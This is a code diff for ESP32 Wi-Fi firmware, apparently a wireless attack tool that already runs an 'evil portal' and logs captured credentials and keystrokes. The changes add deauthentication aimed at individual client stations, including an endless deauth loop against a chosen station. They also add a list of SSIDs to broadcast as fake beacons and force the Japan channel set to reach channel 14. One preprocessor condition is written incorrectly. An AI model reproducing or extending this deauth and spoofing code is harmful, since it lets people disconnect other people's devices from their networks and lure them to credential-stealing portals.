@@ -47,6 +47,14 @@
 #define ARP_DELAY_MS 500
 #define MAX_PACKETS_PER_SECOND 200
 
+#define BEACON_LIST_MAX 16
+#define BEACON_SSID_MAX_LEN 32
+
+static char g_beacon_list[BEACON_LIST_MAX][BEACON_SSID_MAX_LEN+1];
+static int g_beacon_list_count = 0;
+
+static void wifi_beacon_list_task(void *param);
+
 uint16_t ap_count;
 wifi_ap_record_t *scanned_aps;
 const char *TAG = "WiFiManager";
@@ -55,6 +63,8 @@ static char domain_str[128] = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
+static station_ap_pair_t selected_station;
+static bool station_selected = false;
 bool redirect_handled = false;
 httpd_handle_t evilportal_server = NULL;
 dns_server_handle_t dns_handle;
@@ -66,15 +76,30 @@ static uint32_t deauth_packets_sent = 0;
 static bool login_done = false;
 static char current_creds_filename[128] = "";
 static char current_keystrokes_filename[128] = "";
+static int ap_connection_count = 0;
 
 // Station Scan Channel Hopping Globals
 static esp_timer_handle_t scansta_channel_hop_timer = NULL;
 static uint8_t scansta_current_channel = 1;
 static bool scansta_hopping_active = false;
 
+// Dynamic list of channels discovered during AP scan (used for station scanning)
+static int *scansta_channel_list = NULL;
+static size_t scansta_channel_list_len = 0;
+static size_t scansta_channel_list_idx = 0;
+
 // Forward declarations for static channel hopping functions
 static esp_err_t start_scansta_channel_hopping(void);
 static void stop_scansta_channel_hopping(void);
+
+// Station deauthentication task declaration
+static void wifi_deauth_station_task(void *param);
+
+// Helper function forward declaration
+static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size);
+
+// Globals
+static TaskHandle_t deauth_station_task_handle = NULL;
 
 struct service_info {
     const char *query;
@@ -152,11 +177,15 @@ static void event_handler(void *arg, esp_event_base_t event_base, int32_t event_
             printf("AP stopped\n");
             break;
         case WIFI_EVENT_AP_STACONNECTED:
+            ap_connection_count++;
             printf("Station connected to AP\n");
+            esp_wifi_set_ps(WIFI_PS_NONE);
             break;
         case WIFI_EVENT_AP_STADISCONNECTED:
+            if (ap_connection_count > 0) ap_connection_count--;
             printf("Station disconnected from AP\n");
             login_done = false;
+            if (ap_connection_count == 0) esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
             break;
         case WIFI_EVENT_STA_START:
             printf("STA started\n");
@@ -471,6 +500,11 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
         }
 
         printf(
+            "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
+            station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
+            ssid_str, // Use SSID here
+            ap_bssid[0], ap_bssid[1], ap_bssid[2], ap_bssid[3], ap_bssid[4], ap_bssid[5]); // Use original ap_bssid
+        TERMINAL_VIEW_ADD_TEXT(
             "New Station: %02X:%02X:%02X:%02X:%02X:%02X -> Associated AP: %s (%02X:%02X:%02X:%02X:%02X:%02X)\n",
             station_mac[0], station_mac[1], station_mac[2], station_mac[3], station_mac[4], station_mac[5],
             ssid_str, // Use SSID here
@@ -1054,7 +1088,7 @@ void wifi_manager_init(void) {
 
     esp_log_level_set("wifi", ESP_LOG_ERROR); // Only show errors, not warnings
 
-    esp_wifi_set_ps(WIFI_PS_NONE);
+    esp_wifi_set_ps(WIFI_PS_MIN_MODEM);
 
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
@@ -1072,6 +1106,30 @@ void wifi_manager_init(void) {
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
 
     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+
+    // configure country based on chip: full dual-band on C5, 2.4GHz only on others
+#if CONFIG_IDF_TARGET_ESP32C5
+    wifi_country_t current_country;
+    esp_err_t get_country_err = esp_wifi_get_country(&current_country);
+    if (get_country_err == ESP_OK) {
+        ESP_LOGI(TAG, "ESP32-C5 Current Country: CC='%s', schan=%d, nchan=%d, policy=%s",
+                 current_country.cc, current_country.schan, current_country.nchan,
+                 current_country.policy == WIFI_COUNTRY_POLICY_AUTO ? "AUTO" : "MANUAL");
+    } else {
+        ESP_LOGW(TAG, "ESP32-C5: Failed to get current country config: %s", esp_err_to_name(get_country_err));
+    }
+#else
+    // enable all 2.4 GHz channels (1-14) manually for other targets
+    wifi_country_t country_to_set = {
+        .cc     = "JP",
+        .schan  = 1,
+        .nchan  = 14,
+        .policy = WIFI_COUNTRY_POLICY_MANUAL
+    };
+    ESP_LOGI(TAG, "Setting country for non-C5 target: CC='%s', schan=%d, nchan=%d, policy=MANUAL",
+             country_to_set.cc, country_to_set.schan, country_to_set.nchan);
+    ESP_ERROR_CHECK(esp_wifi_set_country(&country_to_set));
+#endif
 
     // Create the WiFi event group
     wifi_event_group = xEventGroupCreate();
@@ -1098,10 +1156,10 @@ void wifi_manager_init(void) {
 
     // Apply the AP configuration
     ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
-
     // Start the Wi-Fi AP
     ESP_ERROR_CHECK(esp_wifi_start());
 
+    // Initialize global CA certificate store
     ret = esp_crt_bundle_attach(NULL);
     if (ret == ESP_OK) {
         printf("Global CA certificate store initialized successfully.\n");
@@ -1122,12 +1180,16 @@ void wifi_manager_start_scan() {
         .show_hidden = true,
         .scan_time = {.active.min = 450, .active.max = 500, .passive = 500}};
 
-    rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);
+    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);
 
     printf("WiFi Scan started\n");
-    printf("Please wait 5 Seconds...\n");
-    TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
-    TERMINAL_VIEW_ADD_TEXT("Please wait 5 Seconds...\n");
+    #ifdef CONFIG_IDF_TARGET_ESP32C5
+        printf("Please wait 10 Seconds...\n");
+        TERMINAL_VIEW_ADD_TEXT("Please wait 10 Seconds...\n");
+    #else
+        printf("Please wait 5 Seconds...\n");
+        TERMINAL_VIEW_ADD_TEXT("Please wait 5 Seconds...\n");
+    #endif
     esp_err_t err = esp_wifi_scan_start(&scan_config, true);
 
     if (err != ESP_OK) {
@@ -1162,7 +1224,7 @@ void wifi_manager_stop_scan() {
     }
 
     wifi_manager_stop_monitor_mode();
-    rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
+    rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
 
     uint16_t initial_ap_count = 0;
     err = esp_wifi_scan_get_ap_num(&initial_ap_count);
@@ -1211,18 +1273,30 @@ void wifi_manager_list_stations() {
         printf("No stations found.\n");
         return;
     }
-
     printf("Listing all stations and their associated APs:\n");
-
     for (int i = 0; i < station_count; i++) {
-        printf("Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n"
-               "     -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1],
-               station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3],
-               station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
-               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1],
-               station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3],
-               station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
+        char sanitized_ssid[33]; // Buffer for sanitized SSID
+        bool found = false;
+        for (int j = 0; j < ap_count; j++) {
+            if (memcmp(scanned_aps[j].bssid, station_ap_list[i].ap_bssid, 6) == 0) {
+                sanitize_ssid_and_check_hidden(scanned_aps[j].ssid, sanitized_ssid, sizeof(sanitized_ssid));
+                found = true;
+                break;
+            }
+        }
+        if (!found) {
+            strcpy(sanitized_ssid, "(Unknown AP)");
+         }
+        printf("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+               i,
+               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
+               sanitized_ssid,
+               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
+        TERMINAL_VIEW_ADD_TEXT("[%d] Station MAC: %02X:%02X:%02X:%02X:%02X:%02X, AP SSID: %s, AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                               i,
+                               station_ap_list[i].station_mac[0], station_ap_list[i].station_mac[1], station_ap_list[i].station_mac[2], station_ap_list[i].station_mac[3], station_ap_list[i].station_mac[4], station_ap_list[i].station_mac[5],
+                               sanitized_ssid,
+                               station_ap_list[i].ap_bssid[0], station_ap_list[i].ap_bssid[1], station_ap_list[i].ap_bssid[2], station_ap_list[i].ap_bssid[3], station_ap_list[i].ap_bssid[4], station_ap_list[i].ap_bssid[5]);
     }
 }
 
@@ -1386,22 +1460,32 @@ void wifi_deauth_task(void *param) {
         if (strlen((const char *)selected_ap.ssid) > 0) {
             for (int i = 0; i < ap_count; i++) {
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap.ssid) == 0) {
-                    for (int y = 1; y < 12; y++) {
+                    // Deauth on the AP's channel
+                    {
+                        int ch = ap_info[i].primary;
                         uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                        wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                        // Increase delay to 50ms
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                        for (int j = 0; j < station_count; j++) {
+                            if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                            }
+                        }
                         vTaskDelay(pdMS_TO_TICKS(50));
                     }
                 }
             }
         } else {
+            // Global deauth on each AP's channel
             for (int i = 0; i < ap_count; i++) {
-                for (int y = 1; y < 12; y++) {
+                int ch = ap_info[i].primary;
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-                    wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    // Increase delay to 50ms
+                wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, broadcast_mac);
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                        wifi_manager_broadcast_deauth(ap_info[i].bssid, ch, station_ap_list[j].station_mac);
+                        }
+                    }
                     vTaskDelay(pdMS_TO_TICKS(50));
-                }
             }
         }
         vTaskDelay(pdMS_TO_TICKS(100));
@@ -1423,7 +1507,7 @@ void wifi_manager_start_deauth() {
         printf("Restarting Wi-Fi\n");
         xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
         beacon_task_running = true;
-        rgb_manager_set_color(&rgb_manager, 0, 255, 0, 0, false);
+        rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
     } else {
         printf("Deauth already running.\n");
         TERMINAL_VIEW_ADD_TEXT("Deauth already running.\n");
@@ -1453,17 +1537,109 @@ void wifi_manager_select_ap(int index) {
 
     selected_ap = scanned_aps[index];
 
+    char sanitized_ssid[33];
+    sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
+
     printf("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
-           selected_ap.ssid, selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
+           sanitized_ssid, selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
            selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);
 
     TERMINAL_VIEW_ADD_TEXT(
-        "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", selected_ap.ssid,
+        "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", sanitized_ssid,
         selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2], selected_ap.bssid[3],
         selected_ap.bssid[4], selected_ap.bssid[5]);
 
     printf("Selected Access Point Successfully\n");
     TERMINAL_VIEW_ADD_TEXT("Selected Access Point Successfully\n");
+}
+
+void wifi_manager_select_station(int index) {
+    if (station_count == 0) {
+        printf("No stations found.\n");
+        TERMINAL_VIEW_ADD_TEXT("No stations found.\n");
+        return;
+    }
+    if (index < 0 || index >= station_count) {
+        printf("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
+        TERMINAL_VIEW_ADD_TEXT("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
+        return;
+    }
+    selected_station = station_ap_list[index];
+    char ssid_str[33];
+    char sanitized_ssid[33];
+    for (int i = 0; i < ap_count; i++) {
+        if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
+            memcpy(ssid_str, scanned_aps[i].ssid, 32);
+            ssid_str[32] = '\0';
+            int len = strlen(ssid_str);
+            for (int j = 0; j < len; j++) {
+                char c = ssid_str[j];
+                sanitized_ssid[j] = (c >= 32 && c <= 126) ? c : '.';
+            }
+            sanitized_ssid[len] = '\0';
+            break;
+        }
+    }
+    printf("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+           index,
+           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
+           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
+           sanitized_ssid,
+           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
+           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    TERMINAL_VIEW_ADD_TEXT("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
+           index,
+           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
+           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
+           sanitized_ssid,
+           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
+           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    station_selected = true;
+}
+
+void wifi_manager_deauth_station(void) {
+    if (!station_selected) {
+        wifi_manager_start_deauth();
+        return;
+    }
+    if (deauth_station_task_handle) {
+        printf("Station deauth already running.\n");
+        return;
+    }
+    ap_manager_stop_services(); // stop AP and HTTP server
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
+    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
+    printf("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
+           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
+           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    TERMINAL_VIEW_ADD_TEXT("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
+           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
+           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
+    xTaskCreate(wifi_deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
+    station_selected = false;
+}
+
+// Background task for deauthenticating a selected station and logging packet rate
+static void wifi_deauth_station_task(void *param) {
+    int deauth_channel = 1;
+    wifi_second_chan_t second_chan;
+    esp_err_t ch_err = esp_wifi_get_channel(&deauth_channel, &second_chan);
+    if (ch_err != ESP_OK || deauth_channel < 1 || deauth_channel > SCANSTA_MAX_WIFI_CHANNEL) {
+        deauth_channel = 1; // fallback channel
+    }
+    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
+    for (;;) {
+        wifi_manager_broadcast_deauth(selected_station.ap_bssid, deauth_channel, selected_station.station_mac);
+        vTaskDelay(pdMS_TO_TICKS(50));
+        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
+        if (now - last_log >= 5000) {
+            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
+            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
+            deauth_packets_sent = 0;
+            last_log = now;
+        }
+    }
 }
 
 #define MAX_PAYLOAD 64
@@ -2228,7 +2404,12 @@ void wifi_auto_deauth_task(void *Parameter) {
 
                     uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                     wifi_manager_broadcast_deauth(ap_info[i].bssid, y, broadcast_mac);
-                    vTaskDelay(pdMS_TO_TICKS(25)); // 25ms delay between deauth packets
+                    for (int j = 0; j < station_count; j++) {
+                        if (memcmp(station_ap_list[j].ap_bssid, ap_info[i].bssid, 6) == 0) {
+                            wifi_manager_broadcast_deauth(ap_info[i].bssid, y, station_ap_list[j].station_mac);
+                        }
+                    }
+                    vTaskDelay(pdMS_TO_TICKS(50));
                 }
                 vTaskDelay(pdMS_TO_TICKS(50)); // 50ms delay between APs
             }
@@ -2270,11 +2451,8 @@ void wifi_manager_print_scan_results_with_oui() {
     }
 
     for (uint16_t i = 0; i < ap_count; i++) {
-        char ssid_temp[33];
-        memcpy(ssid_temp, scanned_aps[i].ssid, 32);
-        ssid_temp[32] = '\0';
-
-        const char *ssid_str = (strlen(ssid_temp) > 0) ? ssid_temp : "Hidden Network";
+        char sanitized_ssid[33];
+        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
         ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
         const char *company_str = "Unknown";
@@ -2305,27 +2483,145 @@ void wifi_manager_print_scan_results_with_oui() {
             break;
         }
 
-        // Print access point information including BSSID
         printf("[%u] SSID: %s,\n"
                "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-               "     RSSI: %d,\n"
-               "     Company: %s\n",
-               i, ssid_str, 
+               "     RSSI: %d,\n",
+               i, sanitized_ssid, 
                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
                scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
                scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-               scanned_aps[i].rssi, company_str);
+               scanned_aps[i].rssi);
 
-        // Log information in terminal view including BSSID
+#ifdef CONFIG_IDF_TARGET_ESP32C5 && CONFIG_IDF_TARGET_ESP32C6
+        {
+            int ch = scanned_aps[i].primary;
+            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
+            printf("     Band: %s,\n", band_str);
+            
+            const char *auth_str = "Unknown";
+            const char *pmf_str = NULL;
+            
+            switch (scanned_aps[i].authmode) {
+                case WIFI_AUTH_OPEN:
+                    auth_str = "Open";
+                    break;
+                case WIFI_AUTH_WEP:
+                    auth_str = "WEP";
+                    break;
+                case WIFI_AUTH_WPA_PSK:
+                    auth_str = "WPA";
+                    break;
+                case WIFI_AUTH_WPA2_PSK:
+                    auth_str = "WPA2";
+                    break;
+                case WIFI_AUTH_WPA_WPA2_PSK:
+                    auth_str = "WPA/WPA2";
+                    break;
+                case WIFI_AUTH_WPA2_ENTERPRISE:
+                    auth_str = "WPA2-Enterprise";
+                    break;
+                case WIFI_AUTH_WPA3_PSK:
+                    auth_str = "WPA3";
+                    pmf_str = "Required";
+                    break;
+                case WIFI_AUTH_WPA2_WPA3_PSK:
+                    auth_str = "WPA2/WPA3";
+                    pmf_str = "Required (WPA3)";
+                    break;
+                case WIFI_AUTH_WAPI_PSK:
+                    auth_str = "WAPI";
+                    break;
+                case WIFI_AUTH_WPA3_ENTERPRISE:
+                    auth_str = "WPA3-Enterprise";
+                    pmf_str = "Required";
+                    break;
+                default:
+                    auth_str = "Unknown";
+                    break;
+            }
+            
+            if (pmf_str) {
+                printf("     Security: %s\n     PMF: %s\n", auth_str, pmf_str);
+            } else {
+                printf("     Security: %s\n", auth_str);
+            }
+        }
+#endif
+        if (strcmp(company_str, "Unknown") != 0) {
+            printf("     Company: %s\n", company_str);
+        }
+
         TERMINAL_VIEW_ADD_TEXT("[%u] SSID: %s,\n"
                                "     BSSID: %02X:%02X:%02X:%02X:%02X:%02X,\n"
-                               "     RSSI: %d,\n"
-                               "     Company: %s\n",
-                               i, ssid_str, 
+                               "     RSSI: %d,\n",
+                               i, sanitized_ssid, 
                                scanned_aps[i].bssid[0], scanned_aps[i].bssid[1],
                                scanned_aps[i].bssid[2], scanned_aps[i].bssid[3],
                                scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
-                               scanned_aps[i].rssi, company_str);
+                               scanned_aps[i].rssi);
+
+#ifdef CONFIG_IDF_TARGET_ESP32C5
+        {
+            int ch = scanned_aps[i].primary;
+            const char *band_str = (ch > 14) ? "5GHz" : "2.4GHz";
+            TERMINAL_VIEW_ADD_TEXT("     Band: %s,\n", band_str);
+            
+            const char *auth_str = "Unknown";
+            const char *pmf_str = NULL;
+            
+            switch (scanned_aps[i].authmode) {
+                case WIFI_AUTH_OPEN:
+                    auth_str = "Open";
+                    pmf_str = "Not Supported";
+                    break;
+                case WIFI_AUTH_WEP:
+                    auth_str = "WEP";
+                    pmf_str = "Not Supported";
+                    break;
+                case WIFI_AUTH_WPA_PSK:
+                    auth_str = "WPA";
+                    pmf_str = "Not Supported";
+                    break;
+                case WIFI_AUTH_WPA2_PSK:
+                    auth_str = "WPA2";
+                    pmf_str = "Optional";
+                    break;
+                case WIFI_AUTH_WPA_WPA2_PSK:
+                    auth_str = "WPA/WPA2";
+                    pmf_str = "Optional";
+                    break;
+                case WIFI_AUTH_WPA2_ENTERPRISE:
+                    auth_str = "WPA2-Enterprise";
+                    pmf_str = "Optional";
+                    break;
+                case WIFI_AUTH_WPA3_PSK:
+                    auth_str = "WPA3";
+                    pmf_str = "Required";
+                    break;
+                case WIFI_AUTH_WPA2_WPA3_PSK:
+                    auth_str = "WPA2/WPA3";
+                    pmf_str = "Required (WPA3)";
+                    break;
+                case WIFI_AUTH_WAPI_PSK:
+                    auth_str = "WAPI";
+                    pmf_str = "Not Applicable";
+                    break;
+                case WIFI_AUTH_WPA3_ENTERPRISE:
+                    auth_str = "WPA3-Enterprise";
+                    pmf_str = "Required";
+                    break;
+                default:
+                    auth_str = "Unknown";
+                    pmf_str = "Unknown";
+                    break;
+            }
+            
+            TERMINAL_VIEW_ADD_TEXT("     Security: %s\n      PMF: %s,\n", auth_str, pmf_str);
+        }
+#endif
+        if (strcmp(company_str, "Unknown") != 0) {
+            TERMINAL_VIEW_ADD_TEXT("     Company: %s\n", company_str);
+        }
     }
 }
 
@@ -2424,7 +2720,7 @@ void wifi_manager_stop_beacon() {
         }
 
         // Turn off RGB indicator
-        rgb_manager_set_color(&rgb_manager, 0, 0, 0, 0, false);
+        rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
 
         // Stop WiFi completely
         esp_wifi_stop();
@@ -2457,6 +2753,7 @@ void wifi_manager_start_ip_lookup() {
 
         int device_count = 0;
         struct DeviceInfo devices[MAX_DEVICES];
+        (void)devices;
 
         for (int s = 0; s < NUM_SERVICES; s++) {
             int retries = 0;
@@ -2640,7 +2937,7 @@ void wifi_manager_start_scan_with_time(int seconds) {
         .show_hidden = true
     };
 
-    rgb_manager_set_color(&rgb_manager, 0, 50, 255, 50, false);
+    rgb_manager_set_color(&rgb_manager, -1, 50, 255, 50, false);
 
     printf("WiFi Scan started\n");
     printf("Please wait %d Seconds...\n", seconds);
@@ -2806,6 +3103,22 @@ void wifi_manager_start_station_scan() {
          printf("Using previously scanned AP list (%d APs).\n", ap_count);
          TERMINAL_VIEW_ADD_TEXT("Using cached AP list.\n");
     }
+    
+    // Build list of unique channels for channel hopping
+    if (scansta_channel_list) { free(scansta_channel_list); scansta_channel_list = NULL; }
+    scansta_channel_list_len = 0;
+    scansta_channel_list = calloc(ap_count, sizeof(int));
+    if (scansta_channel_list) {
+        for (int k = 0; k < ap_count; k++) {
+            int ch = scanned_aps[k].primary;
+            bool found = false;
+            for (size_t m = 0; m < scansta_channel_list_len; m++) {
+                if (scansta_channel_list[m] == ch) { found = true; break; }
+            }
+            if (!found) { scansta_channel_list[scansta_channel_list_len++] = ch; }
+        }
+    }
+    scansta_channel_list_idx = 0;
 
     // Now start monitor mode with the callback
     wifi_manager_start_monitor_mode(wifi_stations_sniffer_callback);
@@ -2845,27 +3158,25 @@ void wifi_manager_scanall_chart() {
 
 
     for (uint16_t i = 0; i < ap_count; i++) {
-        char ssid_temp[33];
-        memcpy(ssid_temp, scanned_aps[i].ssid, 32);
-        ssid_temp[32] = '\0';
-        const char *ssid_str = (strlen(ssid_temp) > 0) ? ssid_temp : "(Hidden)";
+        char sanitized_ssid[33];
+        sanitize_ssid_and_check_hidden(scanned_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
 
         ECompany company = match_bssid_to_company(scanned_aps[i].bssid);
         const char *company_str = "Unknown";
-         switch (company) {
-             case COMPANY_DLINK: company_str = "DLink"; break;
-             case COMPANY_NETGEAR: company_str = "Netgear"; break;
-             case COMPANY_BELKIN: company_str = "Belkin"; break;
-             case COMPANY_TPLINK: company_str = "TPLink"; break;
-             case COMPANY_LINKSYS: company_str = "Linksys"; break;
-             case COMPANY_ASUS: company_str = "ASUS"; break;
-             case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
-             default: company_str = "Unknown"; break;
+        switch (company) {
+        case COMPANY_DLINK: company_str = "DLink"; break;
+        case COMPANY_NETGEAR: company_str = "Netgear"; break;
+        case COMPANY_BELKIN: company_str = "Belkin"; break;
+        case COMPANY_TPLINK: company_str = "TPLink"; break;
+        case COMPANY_LINKSYS: company_str = "Linksys"; break;
+        case COMPANY_ASUS: company_str = "ASUS"; break;
+        case COMPANY_ACTIONTEC: company_str = "Actiontec"; break;
+        default: company_str = "Unknown"; break;
         }
 
         // Print AP details line
         char ap_details_line[200];
-        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, ssid_str,
+        snprintf(ap_details_line, sizeof(ap_details_line), ap_format, sanitized_ssid,
                  scanned_aps[i].bssid[0], scanned_aps[i].bssid[1], scanned_aps[i].bssid[2],
                  scanned_aps[i].bssid[3], scanned_aps[i].bssid[4], scanned_aps[i].bssid[5],
                  scanned_aps[i].primary, company_str);
@@ -2888,6 +3199,8 @@ void wifi_manager_scanall_chart() {
             }
         }
 
+        (void)station_found_for_ap;
+
         // Print separator line below the AP (and its stations) if it's not the last AP
         if (i < ap_count - 1) {
             printf("%s\n", ap_separator);
@@ -2901,4 +3214,201 @@ void wifi_manager_scanall_chart() {
 
     printf("\n--- End of Results ---\n\n");
     TERMINAL_VIEW_ADD_TEXT("--- End of Results ---\n\n");
+}
+
+bool wifi_manager_stop_deauth_station(void) {
+    if (deauth_station_task_handle != NULL) {
+        vTaskDelete(deauth_station_task_handle);
+        deauth_station_task_handle = NULL;
+        ap_manager_start_services();
+        return true;
+    }
+    return false;
+}
+
+// Helper function to sanitize SSID and handle hidden networks
+static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size) {
+    char temp_ssid[33];
+    memcpy(temp_ssid, input_ssid, 32);
+    temp_ssid[32] = '\0';
+
+    if (strlen(temp_ssid) == 0) {
+        snprintf(output_buffer, buffer_size, "(Hidden)");
+    } else {
+        int len = strlen(temp_ssid);
+        int out_idx = 0;
+        for (int k = 0; k < len && out_idx < buffer_size - 1; k++) {
+            char c = temp_ssid[k];
+            output_buffer[out_idx++] = (c >= 32 && c <= 126) ? c : '.';
+        }
+        output_buffer[out_idx] = '\0';
+    }
+}
+
+// Add an SSID to the beacon list
+void wifi_manager_add_beacon_ssid(const char *ssid) {
+    if (g_beacon_list_count >= BEACON_LIST_MAX) {
+        printf("Beacon list full\n");
+        return;
+    }
+    if (strlen(ssid) > BEACON_SSID_MAX_LEN) {
+        printf("SSID too long\n");
+        return;
+    }
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        if (strcmp(g_beacon_list[i], ssid) == 0) {
+            printf("SSID already in list: %s\n", ssid);
+            return;
+        }
+    }
+    strcpy(g_beacon_list[g_beacon_list_count++], ssid);
+    printf("Added SSID to beacon list: %s\n", ssid);
+}
+
+// Remove an SSID from the beacon list
+void wifi_manager_remove_beacon_ssid(const char *ssid) {
+    for (int i = 0; i < g_beacon_list_count; ++i) {
+        if (strcmp(g_beacon_list[i], ssid) == 0) {
+            for (int j = i; j < g_beacon_list_count - 1; ++j) {
+                strcpy(g_beacon_list[j], g_beacon_list[j + 1]);
+            }
